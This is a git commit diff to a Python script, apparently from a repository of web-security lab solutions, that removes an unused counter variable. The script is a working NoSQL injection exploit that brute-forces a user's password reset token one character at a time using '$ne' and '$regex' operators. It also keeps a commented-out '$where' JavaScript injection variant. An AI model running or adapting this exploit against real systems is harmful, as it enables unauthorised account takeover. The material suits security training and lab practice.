739b985cd43bdb6edd4cbf5bef0f198ddf6724c7
MINEGOBLIN <darbymartinsignup@gmail.com>
2025-06-26 13:16:16 +1000

    Remove i Variable

--- NoSQLi/Resources/fieldNameValue_exfiltration.py
+++ NoSQLi/Resources/fieldNameValue_exfiltration.py
@@ -12,13 +12,11 @@ a = ""
 b = string.ascii_letters + string.digits
 x = requests
 
-i = 0
 while True:
     for brute in b:
         login = x.post(url, json={"username":"carlos","password":{"$ne":""},"resetPwdToken":{"$regex":f"^{a}{brute}"}}, proxies=proxies, verify=False) #"$where":f"Object.keys(this)[4].match('^.{{{i}}}{brute}.*')"}, proxies=proxies, verify=False)
         if "Account locked:" in login.text:
             a += brute
-            i += 1
             print(f"Character found: {a}")
         if len(a) == 16:
             print(f"The value is: {a}")
